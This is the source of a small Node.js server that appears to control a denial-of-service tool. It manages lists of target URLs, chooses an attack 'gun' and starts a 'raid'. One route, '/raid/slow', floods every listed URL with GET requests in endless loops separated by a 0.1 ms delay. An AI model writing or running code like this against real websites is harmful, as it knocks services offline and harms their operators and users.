const axios = require("axios");
const fastify = require("fastify")({logger: true});

//managers
const targetManager = require("./managers/targetManager");
const settingsManager = require("./managers/settingsManager");
const config = require("./config");

//guns
const {attack} = require("./guns/fast");

const calculateRunningTime = require("./utils/calculateRunningTime");
const linksArray = require("./utils/linksArray");

/**
 * TEST ROUTE
 */
fastify.get('/test', function handler(request, response) {
    response.send({var: settingsManager.getMethod()})
})

fastify.get('/', function handler(request, response) {
    response.send({hello: 'world'})
})

/**
 * Status of vehicle.
 */
fastify.get('/status', function handler(request, response) {
    response.send({raid: false})
})

//====================== TARGETS ======================//

/**
 * Get current targets.
 */
fastify.get('/targets', function handler(request, response) {
    response.send(targetManager.get())
})

/**
 * Adds target.
 */
fastify.post('/targets/add', function handler(request, response) {
    const t = request.body.target;
    response.send({body: targetManager.add(t)})
})

/**
 * Removes target.
 */
fastify.post('/targets/remove', function handler(request, response) {
    const t = request.body.target;
    response.send({body: targetManager.remove(t)})
})

/**
 * Clears targets file.
 */
fastify.delete('/targets', function handler(request, response) {
    targetManager.clear();
    response.send([]).status(204);
})

//====================== GUNS ======================//

/**
 * Set fight method (gun)
 */
fastify.post('/raid/method', function handler(request, response) {

    if(settingsManager.getIsLaunched() === false) {
        const method = request.body.method;
        const success = settingsManager.setMethod(method);

        if (success) {
            response.send({success: success});
        }
        else {
            response.code(403).send({error: "Make sure that selected method exists"});
        }
    }
    else {
        response.code(403).send({error: "Stop attack first"});
    }
})

/**
 * Start the raid with previously selected method (gun)
 */
fastify.post('/raid/start', async function handler(request, response) {
    const password = request.body.password;

    if(config.PASSWORD === password)
    {
        //select method
        switch (settingsManager.getMethod())
        {
            case "fast": {
                await attack();
                break;
            }
        }

        response.send({success: true});
    }

    response.send({success: false});
})

fastify.post('/raid/stop', function handler(request, response) {

});



/**
 * Start fighting with bypass method
 */
fastify.get('/raid/slow', function handler(request, response) {
    let startTime = new Date();
    const delay = 0.1; //default: 10

    const executeRequest = async (url) => {
        while (true) {
            try {
                await axios.get(url);

                console.log(
                    `Success req to ${url}. Status: SUCCESS. ${calculateRunningTime(
                        startTime,
                        new Date()
                    )}`
                );
            } catch (error) {
                console.log(
                    `Failed req to ${url}. Status: ERROR. ${calculateRunningTime(
                        startTime,
                        new Date()
                    )}`
                );
            }

            await new Promise((req) => setInterval(req, delay));
        }
    };

    linksArray.forEach((link) => executeRequest(link));

    response.send({success: true})
})

// Run the server!
fastify.listen({port: 3000}, (err) => {
    if (err) {
        fastify.log.error(err)
        process.exit(1)
    }
})